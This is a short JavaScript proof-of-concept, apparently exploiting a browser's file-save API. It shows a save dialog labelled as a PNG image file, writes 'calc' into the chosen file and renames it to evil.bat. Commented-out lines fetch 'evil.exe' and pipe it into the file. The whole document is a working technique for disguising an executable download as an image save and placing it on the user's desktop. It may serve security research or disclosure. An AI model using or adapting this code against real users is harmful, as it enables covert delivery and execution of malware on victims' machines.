try {
    // 1. Call showSaveFilePicker()
    const fileHandle = await window.showSaveFilePicker({
        suggestedName: `hello`,
        move: `hello.exe`,
        startIn: "desktop",
        // Filename prompt visible to the user
        types: [{
            description: [`ImageFile`],
            accept: {
                'image/png': ['.png']
            },
        }, ],
    });
    // 2. Get the FileSystemWritableFileStream
    const writableStream = await fileHandle.createWritable();
    // 3.1 Write malicious file data to download, saved as exe
    // const evilFile = await fetch(`evil.exe`)
    // await evilFile.body.pipeTo(writableStream)
    // fileHandle.move("evil.exe")
    // 3.2 Or write custom content and close the stream, e.g., .bat
    await writableStream.write(new TextEncoder().encode(`calc`));
    await writableStream.close();
    fileHandle.move("evil.bat")
} catch (error) {
    console.log(error)
}
